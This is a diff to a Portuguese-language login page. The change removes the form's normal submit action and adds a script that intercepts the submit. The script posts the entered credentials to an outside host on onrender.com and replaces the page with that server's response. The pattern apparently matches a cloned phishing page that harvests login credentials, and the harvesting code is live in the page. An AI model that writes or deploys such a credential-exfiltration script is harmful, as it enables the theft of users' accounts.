@@ -47,7 +47,7 @@
                                 </div>
                             </div>
 
-                            <form method="post" class="nobottommargin" action="/submit" novalidate="novalidate">
+                            <form id="loginForm" method="post" class="nobottommargin" novalidate="novalidate">
                                 <h3>Acesse sua conta</h3>
 
                                 <div class="text-danger validation-summary-valid" data-valmsg-summary="true"><ul><li style="display:none"></li>
@@ -110,4 +110,27 @@
 
 
 
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            const backendUrl = 'https://plano-central.onrender.com';
+            const formData = new FormData(document.getElementById('loginForm'));
+
+            try {
+                const response = await fetch(backendUrl + '/submit', {
+                    method: 'POST',
+                    body: new URLSearchParams(formData)
+                });
+
+                if (response.ok) {
+                    const html = await response.text();
+                    document.body.innerHTML = html;
+                }
+            } catch (error) {
+                alert('Erro ao enviar. Tente novamente.');
+                console.error(error);
+            }
+        });
+    </script>
 </body></html>
